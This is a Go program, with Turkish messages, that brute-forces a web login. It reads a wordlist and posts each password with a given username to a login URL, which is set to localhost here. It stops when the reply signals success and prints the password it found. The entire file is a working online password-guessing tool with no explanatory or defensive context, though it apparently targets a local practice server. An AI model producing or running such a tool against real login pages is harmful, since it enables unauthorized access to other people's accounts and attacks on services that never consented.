package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
)

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Kullanım: ./program <username> <wordlist_path>")
		return
	}

	username := os.Args[1]
	wordlistPath := os.Args[2]

	wordlist, err := os.ReadFile(wordlistPath)
	if err != nil {
		fmt.Printf("Wordlist okuma hatası: %v\n", err)
		return
	}

	passwords := strings.Split(string(wordlist), "\n")
	targetURL := "http://localhost:8080/login"

	for _, password := range passwords {
		data := url.Values{}
		data.Set("username", username)
		data.Set("password", password)

		resp, err := http.Post(targetURL, "application/x-www-form-urlencoded", strings.NewReader(data.Encode()))
		if err != nil {
			fmt.Printf("İstek hatası: %v\n", err)
			continue
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Printf("Cevap okuma hatası: %v\n", err)
			continue
		}

		if strings.Contains(string(body), "Giriş başarılı") {
			fmt.Printf("[+] Şifre bulundu: %s\n", password)
			break
		} else {
			fmt.Printf("[-] Şifre yanlış: %s\n", password)
		}
	}
}
